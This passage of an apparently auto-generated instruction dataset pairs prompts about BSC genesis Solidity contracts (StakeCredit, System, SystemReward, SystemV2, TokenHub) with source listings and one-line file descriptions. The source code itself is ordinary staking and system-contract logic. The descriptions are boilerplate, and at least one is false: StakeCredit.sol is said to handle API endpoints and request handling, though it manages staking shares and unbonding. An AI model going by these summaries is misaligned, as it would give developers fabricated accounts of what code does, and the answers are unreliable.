) public view returns (uint256) {\n        return getPooledBNBByShares(balanceOf(account));\n    }\n\n    /*----------------- internal functions -----------------*/\n    function _bootstrapInitialHolder(\n        uint256 initAmount\n    ) internal onlyInitializing {\n        // check before mint\n        uint256 toLock = IStakeHub(STAKE_HUB_ADDR).LOCK_AMOUNT();\n        if (initAmount <= toLock || validator == address(0) || totalSupply() != 0) revert WrongInitContext();\n\n        // mint initial tokens to the validator and lock some of them\n        // shares is equal to the amount of BNB staked\n        address deadAddress = IStakeHub(STAKE_HUB_ADDR).DEAD_ADDRESS();\n        _mint(deadAddress, toLock);\n        uint256 initShares = initAmount - toLock;\n        _mint(validator, initShares);\n\n        totalPooledBNB = initAmount;\n    }\n\n    function _mintAndSync(address account, uint256 bnbAmount) internal returns (uint256 shares) {\n        // shares here could be zero\n        shares = getSharesByPooledBNB(bnbAmount);\n        _mint(account, shares);\n        totalPooledBNB += bnbAmount;\n    }\n\n    function _burnAndSync(address account, uint256 shares) internal returns (uint256 bnbAmount) {\n        bnbAmount = getPooledBNBByShares(shares);\n        _burn(account, shares);\n        totalPooledBNB -= bnbAmount;\n    }\n\n    function _useSequence(\n        address delegator\n    ) internal returns (uint256 current) {\n        CountersUpgradeable.Counter storage sequence = _unbondSequence[delegator];\n        current = sequence.current();\n        sequence.increment();\n    }\n\n    function _transfer(address, address, uint256) internal pure override {\n        revert TransferNotAllowed();\n    }\n\n    function _approve(address, address, uint256) internal pure override {\n        revert ApproveNotAllowed();\n    }\n}\n\n```"}
{"instruction": "What does the file StakeCredit.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/CountersUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/utils/structs/DoubleEndedQueueUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./interface/0.8.x/IStakeHub.sol\";\n\ncontract StakeCredit is SystemV2, Initializable, ReentrancyGuardUpgradeable, ERC20Upgradeable {\n    using CountersUpgradeable for CountersUpgradeable.Counter;\n    using DoubleEndedQueueUpgradeable for DoubleEndedQueueUpgradeable.Bytes32Deque;\n\n    /*----------------- constants -----------------*/\n    uint256 private constant COMMISSION_RATE_BASE = 10_000; // 100%\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x2fe8dae9\n    error ZeroTotalShares();\n    // @notice signature: 0xf6ed9ce0\n    error ZeroTotalPooledBNB();\n    // @notice signature: 0x8cd22d19\n    error TransferNotAllowed();\n    // @notice signature: 0x20287471\n    error ApproveNotAllowed();\n    // @notice signature: 0x858f9ae4\n    error WrongInitContext();\n    // @notice signature: 0x90b8ec18\n    error TransferFailed();\n    // @notice signature: 0x1f2a2005\n    error ZeroAmount();\n    // @notice signature: 0x9811e0c7\n    error ZeroShares();\n    // @notice signature: 0xf4d678b8\n    error InsufficientBalance();\n    // @notice signature: 0xad418937\n    error NoUnbondRequest();\n    // @notice signature: 0x0f363824\n    error NoClaimableUnbondRequest();\n    // @notice signature: 0xb19e9115\n    error RequestExisted();\n\n    /*----------------- storage -----------------*/\n    address public validator; // validator's operator address\n    uint256 public totalPooledBNB; // total reward plus total BNB staked in the pool\n\n    // hash of the unbond request => unbond request\n    mapping(bytes32 => UnbondRequest) private _unbondRe\n```", "output": "This file `StakeCredit.sol` is part of the contracts project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for System.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\System.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"./interface/0.6.x/ISystemReward.sol\";\nimport \"./interface/0.6.x/IRelayerHub.sol\";\nimport \"./interface/0.6.x/ILightClient.sol\";\n\ncontract System {\n    bool public alreadyInit;\n\n    uint32 public constant CODE_OK = 0;\n    uint16 public constant bscChainID = 0x0038;\n    address public constant VALIDATOR_CONTRACT_ADDR = 0x0000000000000000000000000000000000001000;\n    address public constant SLASH_CONTRACT_ADDR = 0x0000000000000000000000000000000000001001;\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address public constant LIGHT_CLIENT_ADDR = 0x0000000000000000000000000000000000001003;\n    address public constant TOKEN_HUB_ADDR = 0x0000000000000000000000000000000000001004;\n    address public constant INCENTIVIZE_ADDR = 0x0000000000000000000000000000000000001005;\n    address public constant RELAYERHUB_CONTRACT_ADDR = 0x0000000000000000000000000000000000001006;\n    address public constant GOV_HUB_ADDR = 0x0000000000000000000000000000000000001007;\n    address public constant TOKEN_MANAGER_ADDR = 0x0000000000000000000000000000000000001008;\n    address public constant CROSS_CHAIN_CONTRACT_ADDR = 0x0000000000000000000000000000000000002000;\n    address public constant STAKING_CONTRACT_ADDR = 0x0000000000000000000000000000000000002001;\n    address public constant STAKE_HUB_ADDR = 0x0000000000000000000000000000000000002002;\n    address public constant STAKE_CREDIT_ADDR = 0x0000000000000000000000000000000000002003;\n    address public constant GOVERNOR_ADDR = 0x0000000000000000000000000000000000002004;\n    address public constant GOV_TOKEN_ADDR = 0x0000000000000000000000000000000000002005;\n    address public constant TIMELOCK_ADDR = 0x0000000000000000000000000000000000002006;\n    address public constant TOKEN_RECOVER_PORTAL_ADDR = 0x0000000000000000000000000000000000003000;\n\n    modifier onlyCoinbase() {\n        require(msg.sender == block.coinbase, \"the message sender must be the block producer\");\n        _;\n    }\n\n    modifier onlyZeroGasPrice() {\n        require(tx.gasprice == 0, \"gasprice is not zero\");\n        _;\n    }\n\n    modifier onlyNotInit() {\n        require(!alreadyInit, \"the contract already init\");\n        _;\n    }\n\n    modifier onlyInit() {\n        require(alreadyInit, \"the contract not init yet\");\n        _;\n    }\n\n    modifier onlySlash() {\n        require(msg.sender == SLASH_CONTRACT_ADDR, \"the message sender must be slash contract\");\n        _;\n    }\n\n    modifier onlyTokenHub() {\n        require(msg.sender == TOKEN_HUB_ADDR, \"the message sender must be token hub contract\");\n        _;\n    }\n\n    modifier onlyGov() {\n        require(msg.sender == GOV_HUB_ADDR, \"the message sender must be governance contract\");\n        _;\n    }\n\n    modifier onlyValidatorContract() {\n        require(msg.sender == VALIDATOR_CONTRACT_ADDR, \"the message sender must be validatorSet contract\");\n        _;\n    }\n\n    modifier onlyCrossChainContract() {\n        require(msg.sender == CROSS_CHAIN_CONTRACT_ADDR, \"the message sender must be cross chain contract\");\n        _;\n    }\n\n    modifier onlyRelayerIncentivize() {\n        require(msg.sender == INCENTIVIZE_ADDR, \"the message sender must be incentivize contract\");\n        _;\n    }\n\n    modifier onlyRelayer() {\n        require(IRelayerHub(RELAYERHUB_CONTRACT_ADDR).isRelayer(msg.sender), \"the msg sender is not a relayer\");\n        _;\n    }\n\n    modifier onlyTokenManager() {\n        require(msg.sender == TOKEN_MANAGER_ADDR, \"the msg sender must be tokenManager\");\n        _;\n    }\n\n    modifier onlyStakeHub() {\n        require(msg.sender == STAKE_HUB_ADDR, \"the msg sender must be stakeHub\");\n        _;\n    }\n\n    modifier onlyGovernorTimelock() {\n        require(msg.sender == TIMELOCK_ADDR, \"the msg sender must be governor timelock contract\");\n        _;\n    }\n\n    modifier onlyTokenRecoverPortal() {\n        require(msg.sender == TOKEN_RECOVER_PORTAL_ADDR, \"the msg sender must be token recover portal\");\n        _;\n    }\n\n    // Not reliable, do not use when need strong verify\n    function isContract(address addr) internal view returns (bool) {\n        uint256 size;\n        assembly {\n            size := extcodesize(addr)\n        }\n        return size > 0;\n    }\n}\n\n```"}
{"instruction": "What does the file System.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"./interface/0.6.x/ISystemReward.sol\";\nimport \"./interface/0.6.x/IRelayerHub.sol\";\nimport \"./interface/0.6.x/ILightClient.sol\";\n\ncontract System {\n    bool public alreadyInit;\n\n    uint32 public constant CODE_OK = 0;\n    uint16 public constant bscChainID = 0x0038;\n    address public constant VALIDATOR_CONTRACT_ADDR = 0x0000000000000000000000000000000000001000;\n    address public constant SLASH_CONTRACT_ADDR = 0x0000000000000000000000000000000000001001;\n    address public constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address public constant LIGHT_CLIENT_ADDR = 0x0000000000000000000000000000000000001003;\n    address public constant TOKEN_HUB_ADDR = 0x0000000000000000000000000000000000001004;\n    address public constant INCENTIVIZE_ADDR = 0x0000000000000000000000000000000000001005;\n    address public constant RELAYERHUB_CONTRACT_ADDR = 0x0000000000000000000000000000000000001006;\n    address public constant GOV_HUB_ADDR = 0x0000000000000000000000000000000000001007;\n    address public constant TOKEN_MANAGER_ADDR = 0x0000000000000000000000000000000000001008;\n    address public constant CROSS_CHAIN_CONTRACT_ADDR = 0x0000000000000000000000000000000000002000;\n    address public constant STAKING_CONTRACT_ADDR = 0x0000000000000000000000000000000000002001;\n    address public constant STAKE_HUB_ADDR = 0x0000000000000000000000000000000000002002;\n    address public constant STAKE_CREDIT_ADDR = 0x0000000000000000000000000000000000002003;\n    address public constant GOVERNOR_ADDR = 0x0000000000000000000000000000000000002004;\n    address public constant GOV_TOKEN_ADDR = 0x0000000000000000000000000000000000002005;\n    address public constant TIMELOCK_ADDR = 0x0000000000000000000000000000000000002006;\n    address public constant TOKEN_RECOVER_PORTAL_ADDR = 0x0000000000000000000000000000000000003000;\n\n    modifier onlyCoinbase() {\n        require(msg.sender == block.coinbase, \"the message sender must be the block producer\");\n```", "output": "This file `System.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SystemReward.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\SystemReward.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"./System.sol\";\nimport \"./lib/0.6.x/Memory.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/ISystemReward.sol\";\n\ncontract SystemReward is System, IParamSubscriber, ISystemReward {\n    uint256 public constant MAX_REWARDS = 5e18;\n\n    uint256 public numOperator;\n    mapping(address => bool) operators;\n\n    modifier doInit() {\n        if (!alreadyInit) {\n            operators[LIGHT_CLIENT_ADDR] = true;\n            operators[INCENTIVIZE_ADDR] = true;\n            numOperator = 2;\n            alreadyInit = true;\n        }\n        _;\n    }\n\n    modifier onlyOperator() {\n        require(operators[msg.sender], \"only operator is allowed to call the method\");\n        _;\n    }\n\n    event rewardTo(address indexed to, uint256 amount);\n    event rewardEmpty();\n    event receiveDeposit(address indexed from, uint256 amount);\n    event addOperator(address indexed operator);\n    event deleteOperator(address indexed operator);\n    event paramChange(string key, bytes value);\n\n    receive() external payable {\n        if (msg.value > 0) {\n            emit receiveDeposit(msg.sender, msg.value);\n        }\n    }\n\n    function claimRewards(\n        address payable to,\n        uint256 amount\n    ) external override(ISystemReward) doInit onlyOperator returns (uint256) {\n        uint256 actualAmount = amount < address(this).balance ? amount : address(this).balance;\n        if (actualAmount > MAX_REWARDS) {\n            actualAmount = MAX_REWARDS;\n        }\n        if (actualAmount != 0) {\n            to.transfer(actualAmount);\n            emit rewardTo(to, actualAmount);\n        } else {\n            emit rewardEmpty();\n        }\n        return actualAmount;\n    }\n\n    function isOperator(address addr) external view returns (bool) {\n        return operators[addr];\n    }\n\n    function updateParam(string calldata key, bytes calldata value) external override onlyGov {\n        if (Memory.compareStrings(key, \"addOperator\")) {\n            bytes memory valueLocal = value;\n            require(valueLocal.length == 20, \"length of value for addOperator should be 20\");\n            address operatorAddr;\n            assembly {\n                operatorAddr := mload(add(valueLocal, 20))\n            }\n            operators[operatorAddr] = true;\n            emit addOperator(operatorAddr);\n        } else if (Memory.compareStrings(key, \"deleteOperator\")) {\n            bytes memory valueLocal = value;\n            require(valueLocal.length == 20, \"length of value for deleteOperator should be 20\");\n            address operatorAddr;\n            assembly {\n                operatorAddr := mload(add(valueLocal, 20))\n            }\n            delete operators[operatorAddr];\n            emit deleteOperator(operatorAddr);\n        } else {\n            require(false, \"unknown param\");\n        }\n        emit paramChange(key, value);\n    }\n}\n\n```"}
{"instruction": "What does the file SystemReward.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"./System.sol\";\nimport \"./lib/0.6.x/Memory.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/ISystemReward.sol\";\n\ncontract SystemReward is System, IParamSubscriber, ISystemReward {\n    uint256 public constant MAX_REWARDS = 5e18;\n\n    uint256 public numOperator;\n    mapping(address => bool) operators;\n\n    modifier doInit() {\n        if (!alreadyInit) {\n            operators[LIGHT_CLIENT_ADDR] = true;\n            operators[INCENTIVIZE_ADDR] = true;\n            numOperator = 2;\n            alreadyInit = true;\n        }\n        _;\n    }\n\n    modifier onlyOperator() {\n        require(operators[msg.sender], \"only operator is allowed to call the method\");\n        _;\n    }\n\n    event rewardTo(address indexed to, uint256 amount);\n    event rewardEmpty();\n    event receiveDeposit(address indexed from, uint256 amount);\n    event addOperator(address indexed operator);\n    event deleteOperator(address indexed operator);\n    event paramChange(string key, bytes value);\n\n    receive() external payable {\n        if (msg.value > 0) {\n            emit receiveDeposit(msg.sender, msg.value);\n        }\n    }\n\n    function claimRewards(\n        address payable to,\n        uint256 amount\n    ) external override(ISystemReward) doInit onlyOperator returns (uint256) {\n        uint256 actualAmount = amount < address(this).balance ? amount : address(this).balance;\n        if (actualAmount > MAX_REWARDS) {\n            actualAmount = MAX_REWARDS;\n        }\n        if (actualAmount != 0) {\n            to.transfer(actualAmount);\n            emit rewardTo(to, actualAmount);\n        } else {\n            emit rewardEmpty();\n        }\n        return actualAmount;\n    }\n\n    function isOperator(address addr) external view returns (bool) {\n        return operators[addr];\n    }\n\n    function updateParam(string calldata key, bytes calldata value) external override onlyGov {\n        if (Memory.compareStrings(key, \"addOperator\")) {\n            by\n```", "output": "This file `SystemReward.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for SystemV2.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\SystemV2.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ncontract SystemV2 {\n    /*----------------- constants -----------------*/\n    address internal constant VALIDATOR_CONTRACT_ADDR = 0x0000000000000000000000000000000000001000;\n    address internal constant SLASH_CONTRACT_ADDR = 0x0000000000000000000000000000000000001001;\n    address internal constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address internal constant LIGHT_CLIENT_ADDR = 0x0000000000000000000000000000000000001003;\n    address internal constant TOKEN_HUB_ADDR = 0x0000000000000000000000000000000000001004;\n    address internal constant INCENTIVIZE_ADDR = 0x0000000000000000000000000000000000001005;\n    address internal constant RELAYERHUB_CONTRACT_ADDR = 0x0000000000000000000000000000000000001006;\n    address internal constant GOV_HUB_ADDR = 0x0000000000000000000000000000000000001007;\n    address internal constant TOKEN_MANAGER_ADDR = 0x0000000000000000000000000000000000001008;\n    address internal constant CROSS_CHAIN_CONTRACT_ADDR = 0x0000000000000000000000000000000000002000;\n    address internal constant STAKING_CONTRACT_ADDR = 0x0000000000000000000000000000000000002001;\n    address internal constant STAKE_HUB_ADDR = 0x0000000000000000000000000000000000002002;\n    address internal constant STAKE_CREDIT_ADDR = 0x0000000000000000000000000000000000002003;\n    address internal constant GOVERNOR_ADDR = 0x0000000000000000000000000000000000002004;\n    address internal constant GOV_TOKEN_ADDR = 0x0000000000000000000000000000000000002005;\n    address internal constant TIMELOCK_ADDR = 0x0000000000000000000000000000000000002006;\n    address internal constant TOKEN_RECOVER_PORTAL_ADDR = 0x0000000000000000000000000000000000003000;\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x97b88354\n    error UnknownParam(string key, bytes value);\n    // @notice signature: 0x0a5a6041\n    error InvalidValue(string key, bytes value);\n    // @notice signature: 0x116c64a8\n    error OnlyCoinbase();\n    // @notice signature: 0x83f1b1d3\n    error OnlyZeroGasPrice();\n    // @notice signature: 0xf22c4390\n    error OnlySystemContract(address systemContract);\n\n    /*----------------- events -----------------*/\n    event ParamChange(string key, bytes value);\n\n    /*----------------- modifiers -----------------*/\n    modifier onlyCoinbase() {\n        if (msg.sender != block.coinbase) revert OnlyCoinbase();\n        _;\n    }\n\n    modifier onlyZeroGasPrice() {\n        if (tx.gasprice != 0) revert OnlyZeroGasPrice();\n        _;\n    }\n\n    modifier onlyCrossChainContract() {\n        if (msg.sender != CROSS_CHAIN_CONTRACT_ADDR) revert OnlySystemContract(CROSS_CHAIN_CONTRACT_ADDR);\n        _;\n    }\n\n    modifier onlyValidatorContract() {\n        if (msg.sender != VALIDATOR_CONTRACT_ADDR) revert OnlySystemContract(VALIDATOR_CONTRACT_ADDR);\n        _;\n    }\n\n    modifier onlySlash() {\n        if (msg.sender != SLASH_CONTRACT_ADDR) revert OnlySystemContract(SLASH_CONTRACT_ADDR);\n        _;\n    }\n\n    modifier onlyGov() {\n        if (msg.sender != GOV_HUB_ADDR) revert OnlySystemContract(GOV_HUB_ADDR);\n        _;\n    }\n\n    modifier onlyGovernor() {\n        if (msg.sender != GOVERNOR_ADDR) revert OnlySystemContract(GOVERNOR_ADDR);\n        _;\n    }\n\n    modifier onlyStakeHub() {\n        if (msg.sender != STAKE_HUB_ADDR) revert OnlySystemContract(STAKE_HUB_ADDR);\n        _;\n    }\n\n    modifier onlyTokenRecoverPortal() {\n        require(msg.sender == TOKEN_RECOVER_PORTAL_ADDR, \"the msg sender must be token recover portal\");\n        _;\n    }\n}\n\n```"}
{"instruction": "What does the file SystemV2.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ncontract SystemV2 {\n    /*----------------- constants -----------------*/\n    address internal constant VALIDATOR_CONTRACT_ADDR = 0x0000000000000000000000000000000000001000;\n    address internal constant SLASH_CONTRACT_ADDR = 0x0000000000000000000000000000000000001001;\n    address internal constant SYSTEM_REWARD_ADDR = 0x0000000000000000000000000000000000001002;\n    address internal constant LIGHT_CLIENT_ADDR = 0x0000000000000000000000000000000000001003;\n    address internal constant TOKEN_HUB_ADDR = 0x0000000000000000000000000000000000001004;\n    address internal constant INCENTIVIZE_ADDR = 0x0000000000000000000000000000000000001005;\n    address internal constant RELAYERHUB_CONTRACT_ADDR = 0x0000000000000000000000000000000000001006;\n    address internal constant GOV_HUB_ADDR = 0x0000000000000000000000000000000000001007;\n    address internal constant TOKEN_MANAGER_ADDR = 0x0000000000000000000000000000000000001008;\n    address internal constant CROSS_CHAIN_CONTRACT_ADDR = 0x0000000000000000000000000000000000002000;\n    address internal constant STAKING_CONTRACT_ADDR = 0x0000000000000000000000000000000000002001;\n    address internal constant STAKE_HUB_ADDR = 0x0000000000000000000000000000000000002002;\n    address internal constant STAKE_CREDIT_ADDR = 0x0000000000000000000000000000000000002003;\n    address internal constant GOVERNOR_ADDR = 0x0000000000000000000000000000000000002004;\n    address internal constant GOV_TOKEN_ADDR = 0x0000000000000000000000000000000000002005;\n    address internal constant TIMELOCK_ADDR = 0x0000000000000000000000000000000000002006;\n    address internal constant TOKEN_RECOVER_PORTAL_ADDR = 0x0000000000000000000000000000000000003000;\n\n    /*----------------- errors -----------------*/\n    // @notice signature: 0x97b88354\n    error UnknownParam(string key, bytes value);\n    // @notice signature: 0x0a5a6041\n    error InvalidValue(string key, bytes value);\n    // @notice signa\n```", "output": "This file `SystemV2.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TokenHub.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\TokenHub.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"./interface/0.6.x/IBEP20.sol\";\nimport \"./interface/0.6.x/ITokenHub.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\nimport \"./interface/0.6.x/ISystemReward.sol\";\nimport \"./lib/0.6.x/SafeMath.sol\";\nimport \"./System.sol\";\n\ncontract TokenHub is ITokenHub, System, IParamSubscriber, IApplication, ISystemReward {\n    using SafeMath for uint256;\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    struct LockInfo {\n        uint256 amount;\n        uint256 unlockAt;\n    }\n\n    uint256 public constant MAX_BEP2_TOTAL_SUPPLY = 9000000000000000000;\n    uint8 public constant BEP2_TOKEN_DECIMALS = 8;\n    bytes32 public constant BEP2_TOKEN_SYMBOL_FOR_BNB =\n        0x424E420000000000000000000000000000000000000000000000000000000000; // \"BNB\"\n\n    uint256 public constant INIT_MINIMUM_RELAY_FEE = 2e15;\n    uint256 public constant REWARD_UPPER_LIMIT = 1e18;\n    uint256 public constant TEN_DECIMALS = 1e10;\n    uint256 public constant MAX_GAS_FOR_CALLING_BEP20 = 50000;\n    uint256 public constant MAX_GAS_FOR_TRANSFER_BNB = 10000;\n\n    uint256 public relayFee;\n\n    mapping(address => uint256) public bep20ContractDecimals;\n    mapping(address => bytes32) private contractAddrToBEP2Symbol;\n    mapping(bytes32 => address) private bep2SymbolToContractAddr;\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    // the lock period for large cross-chain transfer\n    uint256 public lockPeriod;  // @dev deprecated\n    // the lock Period for token recover\n    uint256 public constant LOCK_PERIOD_FOR_TOKEN_RECOVER = 7 days;\n    // token address => largeTransferLimit amount, address(0) means BNB\n    mapping(address => uint256) public largeTransferLimitMap;  // @dev deprecated\n    // token address => recipient address => lockedAmount + unlockAt, address(0) means BNB\n    mapping(address => mapping(address => LockInfo)) public lockInfoMap;\n    uint8 internal reentryLock;\n\n    event rewardTo(address to, uint256 amount);\n    event receiveDeposit(address from, uint256 amount);\n    event WithdrawUnlockedToken(address indexed tokenAddr, address indexed recipient, uint256 amount);\n\n    event transferInSuccess(address bep20Addr, address refundAddr, uint256 amount);  // @dev deprecated\n    event transferOutSuccess(address bep20Addr, address senderAddr, uint256 amount, uint256 relayFee);  // @dev deprecated\n    event refundSuccess(address bep20Addr, address refundAddr, uint256 amount, uint32 status);  // @dev deprecated\n    event refundFailure(address bep20Addr, address refundAddr, uint256 amount, uint32 status);  // @dev deprecated\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event LargeTransferLocked(address indexed tokenAddr, address indexed recipient, uint256 amount, uint256 unlockAt);  // @dev deprecated\n    event CancelTransfer(address indexed tokenAddr, address indexed attacker, uint256 amount);  // @dev deprecated\n    event LargeTransferLimitSet(address indexed tokenAddr, address indexed owner, uint256 largeTransferLimit);  // @dev deprecated\n\n    // BEP-299: Token Migration after BC Fusion\n    event TokenRecoverLocked(\n        bytes32 indexed tokenSymbol,\n        address indexed tokenAddr,\n        address indexed recipient,\n        uint256 amount,\n        uint256 unlockAt\n    );\n    event CancelTokenRecoverLock(\n        bytes32 indexed tokenSymbol, address indexed tokenAddr, address indexed attacker, uint256 amount\n    );\n    event NotBoundToken(bytes32 indexed tokenSymbol, address indexed recipient, uint256 amount);\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    modifier onlyTokenOwner(address bep20Token) {\n        require(msg.sender == IBEP20(bep20Token).getOwner(), \"not owner of BEP20 token\");\n        _;\n    }\n\n    modifier noReentrant() {\n        require(reentryLock != 2, \"No re-entrancy\");\n        reentryLock = 2;\n        _;\n        reentryLock = 1;\n    }\n\n    function init() external onlyNotInit {\n        relayFee = INIT_MINIMUM_RELAY_FEE;\n        bep20ContractDecimals[address(0x0)] = 18; // BNB decimals is 18\n        alreadyInit = true;\n    }\n\n    receive() external payable {\n        if (msg.value > 0) {\n            emit receiveDeposit(msg.sender, msg.value);\n        }\n    }\n\n    /**\n     * @dev Claim relayer reward to target account\n     *\n     * @param to Whose relay reward will be claimed.\n     * @param amount Reward amount\n     */\n    function claimRewards(\n        address payable to,\n        uint256 amount\n    ) external override onlyInit onlyRelayerIncentivize returns (uint256) {\n        revert(\"deprecated\");\n    }\n\n    function claimMigrationFund(uint256 amount) external onlyStakeHub returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function getMiniRelayFee() external view override returns (uint256) {\n        return relayFee;\n    }\n\n    /**\n     * @dev handle sync cross-chain package from BC\n     *\n     * @param channelId The channel for cross-chain communication\n     * @param msgBytes The rlp encoded message bytes sent from BC\n     */\n    function handleSynPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external override onlyInit onlyCrossChainContract returns (bytes memory) {\n        revert(\"deprecated\");\n    }\n\n    /**\n     * @dev handle ack cross-chain package from BCï¼Œit means cross-chain transfer successfully to BC\n     * and will refund the remaining token caused by different decimals between BSC and BC.\n     *\n     * @param channelId The channel for cross-chain communication\n     * @param msgBytes The rlp encoded message bytes sent from BC\n     */\n    function handleAckPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external override onlyInit onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    /**\n     * @dev handle failed ack cross-chain package from BC, it means failed to cross-chain transfer to BC and will refund the token.\n     *\n     * @param channelId The channel for cross-chain communication\n     * @param msgBytes The rlp encoded message bytes sent from BC\n     */\n    function handleFailAckPackage(\n        uint8 channelId,\n        bytes calldata msgBytes\n    ) external override onlyInit onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    function setLargeTransferLimit(\n        address bep20Token,\n        uint256 largeTransferLimit\n    ) external onlyTokenOwner(bep20Token) {\n        revert(\"deprecated\");\n    }\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    function withdrawUnlockedToken(address tokenAddress, address recipient) external noReentrant {\n        LockInfo storage lockInfo = lockInfoMap[tokenAddress][recipient];\n        require(lockInfo.amount > 0, \"no locked amount\");\n        require(block.timestamp >= lockInfo.unlockAt, \"still on locking period\");\n\n        uint256 _amount = lockInfo.amount;\n        lockInfo.amount = 0;\n\n        bool _success;\n        if (tokenAddress == address(0x0)) {\n            (_success,) = recipient.call{ gas: MAX_GAS_FOR_TRANSFER_BNB, value: _amount }(\"\");\n        } else {\n            _success = IBEP20(tokenAddress).transfer{ gas: MAX_GAS_FOR_CALLING_BEP20 }(recipient, _amount);\n        }\n        require(_success, \"withdraw unlocked token failed\");\n\n        emit WithdrawUnlockedToken(tokenAddress, recipient, _amount);\n    }\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    function cancelTransferIn(address tokenAddress, address attacker) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    /**\n     * @dev request a BC token recover from BSC\n     *\n     * @param tokenSymbol The token symbol on BSC.\n     * @param recipient The destination address of the transfer on BSC.\n     * @param amount The amount to transfer\n     */\n    function recoverBCAsset(\n        bytes32 tokenSymbol,\n        address recipient,\n        uint256 amount\n    ) external override onlyInit onlyTokenRecoverPortal {\n        require(amount <= MAX_BEP2_TOTAL_SUPPLY, \"amount is too large, exceed maximum bep2 token amount\");\n        uint256 convertedAmount;\n        if (tokenSymbol != BEP2_TOKEN_SYMBOL_FOR_BNB) {\n            address contractAddr = bep2SymbolToContractAddr[tokenSymbol];\n            if (contractAddr == address(0x00)) {\n                // if the token is not bound, just emit an event\n                // please notify the token owner to handle the token recovery\n                emit NotBoundToken(tokenSymbol, recipient, amount);\n                return;\n            }\n\n            uint256 bep20TokenDecimals = bep20ContractDecimals[contractAddr];\n            convertedAmount = convertFromBep2Amount(amount, bep20TokenDecimals); // convert to bep20 amount\n            require(IBEP20(contractAddr).balanceOf(address(this)) >= convertedAmount, \"insufficient balance\");\n            _lockRecoverToken(tokenSymbol, contractAddr, convertedAmount, recipient);\n        } else {\n            convertedAmount = amount.mul(TEN_DECIMALS); // native bnb decimals is 8 on BC, while the native bnb decimals on BSC is 18\n            require(address(this).balance >= convertedAmount, \"insufficient balance\");\n            address contractAddr = address(0x00);\n            _lockRecoverToken(tokenSymbol, contractAddr, convertedAmount, recipient);\n        }\n    }\n\n    // lock the token for 7 days to the recipient address\n    function _lockRecoverToken(bytes32 tokenSymbol, address contractAddr, uint256 amount, address recipient) internal {\n        LockInfo storage lockInfo = lockInfoMap[contractAddr][recipient];\n        lockInfo.amount = lockInfo.amount.add(amount);\n        lockInfo.unlockAt = block.timestamp + LOCK_PERIOD_FOR_TOKEN_RECOVER;\n\n        emit TokenRecoverLocked(tokenSymbol, contractAddr, recipient, amount, lockInfo.unlockAt);\n    }\n\n    function cancelTokenRecoverLock(bytes32 tokenSymbol, address attacker) external override onlyTokenRecoverPortal {\n        address tokenAddress = address(0x00);\n        if (tokenSymbol != BEP2_TOKEN_SYMBOL_FOR_BNB) {\n            tokenAddress = bep2SymbolToContractAddr[tokenSymbol];\n            require(tokenAddress != address(0x00), \"invalid symbol\");\n        }\n        LockInfo storage lockInfo = lockInfoMap[tokenAddress][attacker];\n        require(lockInfo.amount > 0, \"no locked amount\");\n\n        uint256 _amount = lockInfo.amount;\n        lockInfo.amount = 0;\n\n        emit CancelTokenRecoverLock(tokenSymbol, tokenAddress, attacker, _amount);\n    }\n\n    /**\n     * @dev request a cross-chain transfer from BSC to BC\n     * @notice this function is deprecated after Feynman upgrade\n     *\n     * @param contractAddr The token contract which is transferred\n     * @param recipient The destination address of the cross-chain transfer on BC.\n     * @param amount The amount to transfer\n     * @param expireTime The expire time for the cross-chain transfer\n     */\n    function transferOut(\n        address contractAddr,\n        address recipient,\n        uint256 amount,\n        uint64 expireTime\n    ) external payable override onlyInit returns (bool) {\n     